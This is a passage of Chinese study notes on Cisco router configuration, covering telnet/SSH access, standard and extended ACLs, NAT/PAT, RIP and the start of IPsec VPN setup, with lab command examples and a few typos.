<h6 id="3）路由器命令"><a href="#3）路由器命令" class="headerlink" title="3）路由器命令"></a>3）路由器命令</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">路由器的命令和交换机命令基本一样</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">远程控制路由器</span><br>&#x27;&#x27;&#x27;路由器的端口的物理状态默认是人为关闭的(administratively down)，因此需要使用no shutdown命令使其处于正常状态&#x27;&#x27;&#x27;<br>1. ip address 10.1.1.1 255.255.255.0    #在进入某个具体端口后，使用该命令给该端口配置ip和掩码,交换机端口不能配ip<br>2. line vty 0 4   #在全局配置模式下，使用该命令，使路由器打开虚拟终端端口，0 4 表示允许5个人通过该端口访问路由器<br>3. password 123456<br>   login		#在进入路由器的虚拟端口后，以上俩条命令一起使用，给进入该进入路由器加密<br>&#x27;&#x27;&#x27;设置完成之后，就可以使用telnet远程登陆该路由器，不过需要注意的是，当使用远程登陆时，若是之前没有给特权模式设置密码，此时进不去特权模式，但是使用console线直接连就没有这种限制,因此若是想要远程控制路由器，需要实现给特权模式设置密码&#x27;&#x27;&#x27;<br>4. transport input ssh	#进入路由器的虚拟端口，将远程访问端口改成SSH（22端口），路由器默认打开是telnet（23端口），该命令后面的参数可以写 all:22，23端口都监听；None:一个端口都不开；ssh:打开22端口； telnet:打开23端口;<br>5. ip domain-name r1.xin.com	#在全局配置模式下，给路由器配置域名（与之前学的域名没有关系） <br>6. crypto key generate rsa 		#使用rsa算法生成密钥（使用该命令的前提：路由器配置好了主机名与域名）<br>&#x27;&#x27;&#x27;使用第4条命令开启ssh后，还需要生成密钥，&#x27;&#x27;&#x27;<br>7. login local #进入某个端口，设置用户密码，且密码与本地数据库进行配对，一般配合建库命令（下一条命令）配合使用，实现身份验证<br>8. username xin password 123.com  #新建本地库用户，账号为xin 密码为123.com<br>&#x27;&#x27;&#x27;使用ssh登陆，若是设置了本地用户数据库，则需要使用下面的命令（1）连接，普通的password login的加密使用命令（2）&#x27;&#x27;&#x27;<br>9. （1）ssh -l username 10.1.1.254	（2）ssh -l hostname 10.1.1.254<br>&#x27;&#x27;&#x27;使用telnet登陆，使用如下命令即可，不同的是，若设置了用户本地数据库，则需要输入用户名和密码，普通的只需要输入密码&#x27;&#x27;&#x27;<br>10. telnet 10.1.1.254<br><br></code></pre></td></tr></table></figure>

<h5 id="抓包验证帧结构："><a href="#抓包验证帧结构：" class="headerlink" title="抓包验证帧结构："></a>抓包验证帧结构：</h5><h4 id="5）物理层："><a href="#5）物理层：" class="headerlink" title="5）物理层："></a>5）物理层：</h4><p>​				将数据帧转化为数字信号:比特（bit）<br>​				代表物理信道：网线，光纤，空气<br>​				物理层传输单元：比特:bit；8bit &#x3D; 1Byte; 1024B &#x3D; 1KB; 1024KB &#x3D; 1MB</p>
<p>​				信号：<br>​					1）模拟信号：无法复原<br>​					2）数字信号：物理层传输的是数字信号，特有的信号复原功能<br>​					俩者统称为<strong>电信号</strong><br>​					3）光信号：一般光纤传输的都是红光	<br>​						光纤的分类：						<br>​							（1）.单模光纤：只能传输一种光，效率较高，一般是黄色<br>​							（2）.多模光纤：能传输多种光，但是当距离过长会导致效率变低，因为各种光之间会互相干扰，一般是橙色&#x2F;蓝色<br>​						网线&#x2F;双绞线:<br>​							（1）5类双绞线<br>​							（2）超5类双绞线<br>​							（3）6类双绞线<br>​							（4）7类双绞线<br>​						网线标准：<br>​								T568A: 白绿，绿，白橙，<strong>蓝，白蓝</strong>，橙，<strong>白棕，棕</strong><br>​								T568B: 白橙，橙，白绿，<strong>蓝，白蓝</strong>，绿，<strong>白棕，棕</strong><br>​						网线的用途分类：<br>​								交叉线：网线一端用A标准，另一端用B标准，即计算机用1，2通道发数据（白绿，绿），用3，6通道收（白绿，												绿），一般是同种设备间使用。（具有三层及三层以上的设备统称为同种设备）<br>​								直通线：两端都是A或都是B，异种设备间使用。现在市面上的网线一般都是<strong>B线序</strong>				<br>​								全反线：一端为A，另一端为反A，也称console线，对路由器，防火墙等设备进行初始化操作	<br>​							注：<strong>现在网口一般都带有反转功能，即使没有正确使用网线，也能使用</strong></p>
<h4 id="五层协议结构关系图："><a href="#五层协议结构关系图：" class="headerlink" title="五层协议结构关系图："></a>五层协议结构关系图：<img src="/staticImg/image-20240418175631118.png" alt="image-20240418175631118"></h4><h2 id="13ACL"><a href="#13ACL" class="headerlink" title="13ACL"></a>13ACL</h2><p>​	Access Control List：访问控制列表，是一种包过滤技术；</p>
<p>​	其是基于IP包头的ip地址，四层TCP&#x2F;UDP头部的端口号、[5层数据] 进行过滤；（一般不建议对五层数据进行过滤，会降低效率）；基于三层和四层过滤；</p>
<p>​	ACL在路由器上配置，也可以在防火墙上配置（一般称为策略）；</p>
<h3 id="13-1ALC主要分为俩大类"><a href="#13-1ALC主要分为俩大类" class="headerlink" title="13.1ALC主要分为俩大类"></a>13.1ALC主要分为俩大类</h3><h4 id="1）标准ACL"><a href="#1）标准ACL" class="headerlink" title="1）标准ACL"></a>1）标准ACL</h4><p>​		表号：1-99</p>
<p>​		特点：只能基于源ip对包进行过滤</p>
<h5 id="–命令"><a href="#–命令" class="headerlink" title="–命令"></a>–命令</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">创建条目</span><br>conf t<br>	access-list 表号 permit/deny 源ip/源网段 反子网掩码<br>&#x27;&#x27;&#x27;注意：反子网掩码是将正子网掩码0和1倒置：例如 255.255.255.0 ---反子网掩码为---- 0.0.0.255&#x27;&#x27;&#x27;<br>&#x27;&#x27;&#x27;反子网掩码的作用：用于匹配，与0对应的需要严格匹配，与1对应的不匹配&#x27;&#x27;&#x27;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">例子</span><br>1.access-list 1 deny 10.1.3.1 0.0.255.255<br>&#x27;&#x27;&#x27;上面这一句的作用为：ip满足10.1开头的ip则被禁止通过&#x27;&#x27;&#x27;<br>2.acess-list 1 deny 10.1.1.1 0.0.0.0<br>&#x27;&#x27;&#x27;上面这一句的作用为：禁止ip为10.1.1.1的ip通过（拒绝某台主机的通过），可以简写为下面的形式：&#x27;&#x27;&#x27;<br>access-list 1 deny host 10.1.1.1		&#x27;&#x27;&#x27;拒绝所有ip为10.1.1.1的主机&#x27;&#x27;&#x27;<br>3.access-list 1 deny 0.0.0.0 255.255.255.255<br>&#x27;&#x27;&#x27;上面这一句的作用为：拒绝所有人，也可以简写为以下的形式：&#x27;&#x27;&#x27;<br>access-list 1 deny any<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看ACL表</span><br>show ip access-list [表号]	#不加表号，查看所有的ACL表；加上表号，查看具体某张表<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">将ACL表应用到接口</span><br>int f0/x<br>	ip access-group 表号 in/out	#进入某个端口中，使用该命令ACL表应用到该接口<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除整张表</span><br>no access-list 表号   #在全局配置模式下，使用该命令，删除整张表<br></code></pre></td></tr></table></figure>

<h4 id="2）扩展ACL"><a href="#2）扩展ACL" class="headerlink" title="2）扩展ACL"></a>2）扩展ACL</h4><p>​		表号：100-199</p>
<p>​		特点：可以基于源ip、目标ip、端口号、协议等对包进行过滤</p>
<h5 id="–命令-1"><a href="#–命令-1" class="headerlink" title="–命令"></a>–命令</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">创建条目</span><br>conf t<br>	access-list 100 permit/deny 协议 源ip/源网段 反子网掩码 目标ip/目标网段 反子网掩码 [eq 端口号]<br>&#x27;&#x27;&#x27;需要满足所有的条件才能执行动作，最后的端口号是一个可选项，前面的参数是一定要写的<br>&#x27;&#x27;&#x27;其中学过的协议有：tcp/udp/icmp/ip；（arp出不了路由器，因此不必考虑）;其中若使用了端口号，则必须是tcp/udp协议 <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">例子</span><br>1. access-list 100 permit tcp host 10.1.1.1 host 20.1.1.3 eq 80<br>   access-list 100 permit icmp host 10.1.1.1 20.1.1.0 0.0.0.255 [echo-reply]<br>   access-list 100 deny ip host 10.1.1.1 20.1.1.0 0.0.0.255<br>   access-list 100 permit any any<br>&#x27;&#x27;&#x27;以上的条目的作用：10.1.1.1 PC可以访问20.1.1.3中传输协议为tcp协议且端口为80的服务；<br>&#x27;&#x27;&#x27;允许10.1.1.1 PC向20.1.1.0/24网段发送icmp回包（类型为0）；最后的 echo-reply参数可能有错<br>&#x27;&#x27;&#x27;但是禁止10.1.1.1访问20.1.1.0/24网段的其它服务；<br>&#x27;&#x27;&#x27;其它ip正常访问；<br></code></pre></td></tr></table></figure>

<h4 id="3）ACL原理"><a href="#3）ACL原理" class="headerlink" title="3）ACL原理"></a>3）ACL原理</h4><p>​	（1）ACL表必须应用到接口的进或出方向才生效<br>​	（2）一个接口的一个方向只能应用一张表<br>​	（3）进还是出方向应用，取决于流量控制的总方向<br>​	（4）ACL表是严格自上而下检查每一条，所以要注意书写顺序；<strong>大部分ACL表的最后有一个默认策略 any deny：任何流量均不可通过</strong><br>​	（5）每一条策略都是由条件和动作组成，当某流量没有满足条件时，则继续检查下一条；若满足则直接放行，后面的不再检查<br>​	（6）标准ACL尽量写在靠近目标的地方<br>​	（7）用ACL做流量控制的过程：<br>​				首先判断ACL写的位置：哪个路由器？哪个接口的哪个方向？<br>​				再考虑怎么写？<br>​					首先判断最终是要允许所有还是拒绝所有<br>​					其次注意：将严格的策略控制写在前面<br>​	（8）一般情况下，标准或扩展ACL一旦编写好，<strong>无法修改某一条，也无法删除某一条，也无法修改顺序，也无法在中间插入新的条目，只能一直在最后添加新的条目</strong><br>​				若想修改、插入或删除，只能删除整张表，重新写</p>
<h4 id="–实验-3"><a href="#–实验-3" class="headerlink" title="–实验"></a>–实验</h4><p><img src="/staticImg/image-20240513172458583.png" alt="image-20240513172458583"></p>
<h4 id="4）命名ACL"><a href="#4）命名ACL" class="headerlink" title="4）命名ACL"></a>4）命名ACL</h4><p>​		<strong>并不是第三类ACL</strong>，只是对标准或扩展ACL的功能进行一些扩展</p>
<h5 id="–作用："><a href="#–作用：" class="headerlink" title="–作用："></a>–作用：</h5><p>​			可以对标准或扩展ACL进行自定义命名</p>
<h5 id="–优点："><a href="#–优点：" class="headerlink" title="–优点："></a>–优点：</h5><p>​			1.自定义命名更容易辨认（可读性较强），也便于记忆</p>
<p>​			2.通过命名ACL可以进入任何ACL（标准或扩展），之后便可以任意修改某一条，或删除某一条，也可以往中间插入某一条</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">通过ACL进入标准或扩展ACL</span><br>conf t<br>	ip access-list standard/extended 表名(表号)<br></code></pre></td></tr></table></figure>

<h5 id="–命令-2"><a href="#–命令-2" class="headerlink" title="–命令"></a>–命令</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">命名ACL的创建</span><br>conf t <br>	ip access-list extended kz-80-oa		#使用该命令之后，会进入一个条目编写环境<br>	permit tcp 192.268.0.0 0.0.255.255 host 10.1.1.1 eq 80	#在条目编写环境下，可以直接从permit/deny开始编写命令<br>	permit tcp 172.16.0.0 0.0.255.255 host 10.1.1.1 eq 80<br>	deny ip 192.168.0.0 0.0.255.255 host 10.1.1.0<br><br>&#x27;&#x27;&#x27;在条目编写环境，可以直接使用以下命令删除某条条目<br>no 条目标号/条目命令			&#x27;&#x27;&#x27;其中条目标号为：通过 show ip access-list extended kz-80-oa 显示ACL列表的第一列值<br><br>&#x27;&#x27;&#x27;若要在某俩条条目之间插入一个条目，则使用下面的命令<br>条目标号 permit tcp 172.16.0.0 0.0.255.255 host 10.1.1.1 eq 80		&#x27;&#x27;&#x27;其中 条目标号 的取值范围在 需要插入的俩条条目的条目标号之间即可<br><br><br></code></pre></td></tr></table></figure>

<h4 id="5）实验"><a href="#5）实验" class="headerlink" title="5）实验"></a>5）实验</h4><p><img src="/staticImg/image-20240514094223232.png" alt="image-20240514094223232"></p>
<h3 id="14NAT"><a href="#14NAT" class="headerlink" title="14NAT"></a>14NAT</h3><p>​	Network Address Translations : 网络地址转换</p>
<p>​	NAT主要实现公私有地址的转换，一般是路由器或者防火墙上来完成，不建议在三层交换机上配置</p>
<p>​	主要是为了解决ipv4地址不够用的问题</p>
<h5 id="14-1IP地址的分类"><a href="#14-1IP地址的分类" class="headerlink" title="14.1IP地址的分类"></a>14.1IP地址的分类</h5><h6 id="1）公网ip"><a href="#1）公网ip" class="headerlink" title="1）公网ip"></a>1）公网ip</h6><p>​		公网ip只能在公网中使用，<strong>公网上不允许出现私有ip地址</strong></p>
<p>​		只用于将内网服务器映射到公网的ip被称为<code>虚拟公网ip（vip）</code></p>
<h6 id="2）私网ip"><a href="#2）私网ip" class="headerlink" title="2）私网ip"></a>2）私网ip</h6><p>​		私网ip只能在私网中使用，私网ip可以重复在内网中使用</p>
<p>​		私有地址范围：<br>​			（1）10.0.0.0&#x2F;8<br>​			（2）172.16.0.0&#x2F;16-172.31.0.0&#x2F;16<br>​			（3）192.168.0.0&#x2F;16</p>
<h5 id="14-2NAT的三大类"><a href="#14-2NAT的三大类" class="headerlink" title="14.2NAT的三大类"></a>14.2NAT的三大类</h5><p>​	在路由器上配置NAT时，还需要定义内外网端口，<strong>定义该端口的作用</strong>：<br>​		内到外：转换源IP<br>​		外到内：转换目标</p>
<h6 id="1）静态NAT"><a href="#1）静态NAT" class="headerlink" title="1）静态NAT"></a>1）静态NAT</h6><p>​		当内网访问外网的时候，通过路由器中的NAT地址转换表，将源ip地址转换为公网ip</p>
<p>​		缺点：<br>​			1.NAT地址转换表是固定的<br>​			2.只能一个人上网，当内网其它ip要上网时，需要修改NAT地址表</p>
<p>​		<code>注意</code>：静态NAT也称为1对1映射，其也可以与PAT共同使用，此时称为静态PAT（端口映射技术）</p>
<h6 id="2）动态NAT（基本不用）"><a href="#2）动态NAT（基本不用）" class="headerlink" title="2）动态NAT（基本不用）"></a>2）动态NAT（基本不用）</h6><p>​		当内网访问外网的时候，同样是通过路由器中的NAT地址转换表来将源ip替换成公网ip，但是此时该NAT地址转换表不是固定的，而是当有人从内网访问外网时，通过<code>动态NAT映射</code>，自动在NAT地址转换表中生成一条条目，当该条目中记录的内网ip没有发送包后经过24小时，该条目会自动删除，此时内网中其他人即可上网。</p>
<p>​		<code>动态NAT映射</code>：路由器中会生成内部地址池和外部池，其中内部地址池记录内网中的ip&#x2F;网段，外部池中记录外网ip，若是内网中的某个ip访问外网时，会将内网ip与内部地址池中的ip&#x2F;网段进行匹配，匹配成功，则将其与外部池中的公网ip进行映射，并记录在NAT地址转换表中，记录的内容为 <code>源ip 公网ip</code>。</p>
<p>​		缺点：<br>​			1.虽然NAT地址表不是固定的，但是内网中多台设备需要上网，而外部池中的公网ip较少，需要竞争外部池中的公网ip</p>
<h6 id="3）PAT（端口地址转换：Port-Address-Translation）-端口复用技术"><a href="#3）PAT（端口地址转换：Port-Address-Translation）-端口复用技术" class="headerlink" title="3）PAT（端口地址转换：Port Address Translation）-端口复用技术"></a>3）PAT（端口地址转换：Port Address Translation）-端口复用技术</h6><p>​		当内网访问外网时，同样通过动态NAT映射在NAT地址转换表中动态形成条目，但与上面俩中不同的是，此处外部池中的公网ip是<code>可以复用</code>的，并且在NAT地址表中记录条目的时候，不仅会记录源ip和公网ip，还会记录帧中的<code>四层数据的端口号以及路由器自己生成的唯一端口号</code>,保证外网往内网回数据的时候能够通过NAT地址转换表**<code>唯一识别内网中的设备</code>**，且若某台设备没有继续发送数据包，则在60s后，由该设备访问外网生成的条目回自动删除。</p>
<p>​		与静态NAT和动态NAT的不同在于：<strong>不仅做地址转换，还做端口转换</strong></p>
<p>​		<code>端口号的范围</code>：0-65535（所有设备的端口号均是在这个范围）</p>
<h5 id="14-3NAT命令"><a href="#14-3NAT命令" class="headerlink" title="14.3NAT命令"></a>14.3NAT命令</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">1.定义内网端口</span><br>int f0/0 <br>	ip nat inside<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">2.定义外网端口</span><br>int f0/1<br>	ip nat outside<br><span class="hljs-meta prompt_">	</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">3.配置PAT</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">3.1定义内部地址池</span><br>access-list 1 permit 192.168.0.0 0.0.255.255	&#x27;&#x27;&#x27;和ACL的命令一样，但是此处不是作为ACL,而是作为容器，匹配后面规则的ip都属于1容器<br><span class="hljs-meta prompt_">#</span><span class="language-bash">3.2做PAT动态映射</span><br>conf t<br>	ip nat inside source list 1 int f0/1 overload<br><span class="hljs-meta prompt_">	</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">4配置静态端口转换</span><br>conf t <br>	ip nat inside source static tcp 192.168.1.3 80 100.1.1.2 80	&#x27;&#x27;&#x27;静态端口转换<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">5.查看NAT地址转换表</span><br>show ip nat translations<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">6.清空NAT地址转换表</span><br>clear ip nat translations *<br></code></pre></td></tr></table></figure>

<h6 id="–实验-4"><a href="#–实验-4" class="headerlink" title="–实验"></a>–实验</h6><p>要求：将两台服务器通过端口映射技术映射出去（使用同一个公网ip映射和使用不同公网ip映射）</p>
<p><img src="/staticImg/image-20240514181056322.png" alt="image-20240514181056322"></p>
<h3 id="15动态路由"><a href="#15动态路由" class="headerlink" title="15动态路由"></a>15动态路由</h3><p>​	基于某种路由协议实现的</p>
<ul>
<li>动态路由的特点</li>
</ul>
<p>​		1）减轻管理负担<br>​		2）需要占用网络带宽</p>
<ul>
<li>动态路由协议概述</li>
</ul>
<p>​		路由器之间用来交换信息的语言</p>
<ul>
<li>度量值</li>
</ul>
<p>​		跳数、带宽、负载、时延、可靠性、成本</p>
<ul>
<li>收敛</li>
</ul>
<p>​		所有的路由表都达到一致状态的过程</p>
<ul>
<li>静态路由与动态路由的比较</li>
</ul>
<p>​		网络中静态路由和动态路由互相补充</p>
<h4 id="15-1按照路由执行的算法分类（路由协议的分类）"><a href="#15-1按照路由执行的算法分类（路由协议的分类）" class="headerlink" title="15.1按照路由执行的算法分类（路由协议的分类）"></a>15.1按照路由执行的算法分类（路由协议的分类）</h4><ul>
<li>距离矢量路由协议<br>依据从源网络到目标网络所经过的路由器的个数选择路由；如RIP、IGRP</li>
<li>链路状态路由协议<br>综合考虑从源网络到目标网络的各条路径的情况选择路由；如OSPF、IS-IS</li>
</ul>
<p>					</p>
<h5 id="1）RIP"><a href="#1）RIP" class="headerlink" title="1）RIP"></a>1）RIP</h5><p>​	RIP是距离-矢量路由选择协议</p>
<h6 id="–基本概念"><a href="#–基本概念" class="headerlink" title="–基本概念"></a>–基本概念</h6><ul>
<li>定期更新：即使最后达到收敛状态，依旧每隔<code>30s</code>定期更新</li>
<li>邻居：与相邻的路由器通信，发送自己路由表给其它路由器，且接收其它路由器的路由表来更新自己的路由表</li>
<li>广播更新：通过广播通信</li>
<li>全路由表更新：每次都发送全局的路由表</li>
</ul>
<p>​	<strong>注意：</strong></p>
<ul>
<li>路由器首先会学习到直连路由</li>
<li>更新周期30s到时，路由器会向邻居发送路由表</li>
<li>RIP度量值为跳数：最大跳数为15跳，16跳为不可达</li>
<li>RIP更新时间：每隔30s发送路由更新信息，<code>UDP520</code>端口</li>
<li>RIP路由更新消息：发送整个路由表信息</li>
<li>路由环路：当某条线路故障，路由表会将该线路标记为不可达，若此时R2向R3发送路由更新信息，R3会学到错误的40.0.0.0的路由信息，导致后续R3向R2发送路由更新信息时，也会将40.0.0.0的错误信息带给R2（由于最开始R2的40.0.0.0的信息就是R3发送给R2的，因此即使此时R2路由表中的40.0.0.0跳数比R3的低，R2依旧会学习R3的40.0.0.0的路由信息），最终导致路由环路</li>
</ul>
<p><img src="/staticImg/image-20240516101902769.png" alt="image-20240516101902769"></p>
<p>​	解决方法：执行水平分割可以阻止路由环路的发生（RIP路由器默认开启该功能）<br>​			（1）从一个接口学习到的路由信息，不再从这个发送出去<br>​			（2）同时也能减少路由更新信息占用的链路带宽资源</p>
<h6 id="–命令-3"><a href="#–命令-3" class="headerlink" title="–命令"></a>–命令</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">开启RIP路由协议</span><br>router rip	&#x27;&#x27;&#x27;全局配置模式下，使用该命令，开启rip并进入rip路由协议的配置选项<br>	version 2		&#x27;&#x27;&#x27;选择版本,version 1发送更新信息不带子网掩码，version 2会带子网掩码<br>	network 10.0.0.0	&#x27;&#x27;&#x27;激活某个接口（该接口的网段：必须使用A,B,C类地址的写法）<br>	nerwork 20.0.0.0<br>	no auto-summary		&#x27;&#x27;&#x27;取消路由器自动汇总：汇总会将收到路由ip自动归类为A,B,C类地址,从而使用这三类地址的子网掩码，而不是使用收到的路由信息中的子网掩码<br><span class="hljs-meta prompt_">	</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看路由器使用的路由协议</span><br>show ip protocols<br></code></pre></td></tr></table></figure>

<h6 id="–综合实验"><a href="#–综合实验" class="headerlink" title="–综合实验"></a>–综合实验</h6><p><img src="/staticImg/image-20240516153617260.png" alt="image-20240516153617260"></p>
<h3 id="16VPN"><a href="#16VPN" class="headerlink" title="16VPN"></a>16VPN</h3><p>​	VPN：Vitural Private Network（虚拟专有网络&#x2F;虚拟专网）：VPN只是一种技术，使用PKI技术，来保证数据安全的三要素（机密性，完整性，身份验证）</p>
<p>​	加密技术：</p>
<ul>
<li>对称加密：加密与解密使用相同的密钥；密钥是通信双方协商生成；<strong>生成过程是明文通信的，因此密钥容易泄露！</strong>速度快！</li>
</ul>
<p>​			对称加密算法：DES、3DES、AES</p>
<ul>
<li>非对称加密：使用公私钥加密数据；公私钥成对出现，互为加解密关系；公私钥不能互相推算；双方交换公钥，并使用对方的公钥加密实现机密性；使用自己的私钥进行签名，实现身份验证；速度慢，安全性高</li>
</ul>
<p>​			非对称加密算法：RAS，DH</p>
<ul>
<li>完整性算法&#x2F;hash值算法：MD5，SHA</li>
</ul>
<h4 id="16-1vpn的作用"><a href="#16-1vpn的作用" class="headerlink" title="16.1vpn的作用"></a>16.1vpn的作用</h4><p>​	VPN可以实现在不安全的网络上（一般指互联网），安全的传输数据，类似专网一样</p>
<h4 id="16-2VPN的类型"><a href="#16-2VPN的类型" class="headerlink" title="16.2VPN的类型"></a>16.2VPN的类型</h4><h5 id="1）远程访问VPN（Remote-Access-VPN）"><a href="#1）远程访问VPN（Remote-Access-VPN）" class="headerlink" title="1）远程访问VPN（Remote Access VPN）"></a>1）远程访问VPN（Remote Access VPN）</h5><ul>
<li><p>一般用在个人到安全连接到企业内部！</p>
</li>
<li><p>一般出差员工&#x2F;在家办公，安全连接内网时使用！</p>
</li>
<li><p><strong>一般公司部署VPN服务器，员工在外拨号连接VPN即可！</strong></p>
</li>
</ul>
<p>​		常见RA-VPN协议：PPTP VPN、L2TP VPN、SSTP VPN（前面三种基本过时）<br>​									  EZvpn&#x2F;easyvpn（思科私有）<br>​									  <strong>SSL VPN（常见）</strong></p>
<h5 id="2）点到点VPN"><a href="#2）点到点VPN" class="headerlink" title="2）点到点VPN"></a>2）点到点VPN</h5><ul>
<li><p>一般用在企业对企业安全连接！</p>
</li>
<li><p>一般需要在俩个企业总出口设备之间建立VPN通道！</p>
</li>
</ul>
<p>​		常见的点到点VPN：IPsecVPN</p>
<h4 id="16-3点到点VPN：IPsecVPN"><a href="#16-3点到点VPN：IPsecVPN" class="headerlink" title="16.3点到点VPN：IPsecVPN"></a>16.3点到点VPN：IPsecVPN</h4><ul>
<li>属于点到点VPN，可以在2家企业之间建立VPN隧道！</li>
<li>VPN隧道优点：安全性！合并俩家企业内网！</li>
<li>VPN隧道技术：</li>
</ul>
<p>​			（1）传输模式：只加密上层数据，不加密私有IP包头<br>​			（2）隧道模式：加密整个私有IP包，包括IP包头，更安全，速度慢</p>
<h5 id="1）IPsecVPN分为2大阶段："><a href="#1）IPsecVPN分为2大阶段：" class="headerlink" title="1）IPsecVPN分为2大阶段："></a>1）IPsecVPN分为2大阶段：</h5><h6 id="–第一阶段：管理连接"><a href="#–第一阶段：管理连接" class="headerlink" title="–第一阶段：管理连接"></a>–第一阶段：管理连接</h6><p>​			目的：通信双方设备通过非对称加密算法来加密对称算法所使用的对称密钥！</p>
<p>​			命令：<code>双方配置只有传输集名称、lifetime、以及 对方公网ip地址 不一样，其余全要一样</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">conf t<br>	crypto isakmp policy 1			&#x27;&#x27;&#x27;传输集/策略集 IKE:互联网密钥交换，后面的参数1代表策略名<br>		encryption des/3des/aes		&#x27;&#x27;&#x27;传输数据使用的对称加密算法密钥<br>		hash md5/sha				&#x27;&#x27;&#x27;完整性验证算法<br>		group 1/2/5					&#x27;&#x27;&#x27;默认使用DH非对称加密算法，此处选择DH 1/2/5<br>		authentication pre-share	&#x27;&#x27;&#x27;设置预共享密钥，该密钥与数据一起经过完整性算法，保证数据不被篡改（身份验证）；预共享密钥，需要双方配置一致，因为其不在互联网上传播<br>		lifetime 秒					&#x27;&#x27;&#x27;不设置的话，默认86400秒（24小时），多久密钥过期<br>		exit<br>	crypto isakmp key 预共享密钥 address 对方的公网ip地址<br></code></pre></td></tr></table></figure>

<h6 id="–第二阶段：数据连接"><a href="#–第二阶段：数据连接" class="headerlink" title="–第二阶段：数据连接"></a>–第二阶段：数据连接</h6><p>​			目的：通过对称加密算法加密实际所要传输的私网数据！</p>
<p>​			命令：<code>除第一条定义触发流量外，双方配置必须一样</code></p>
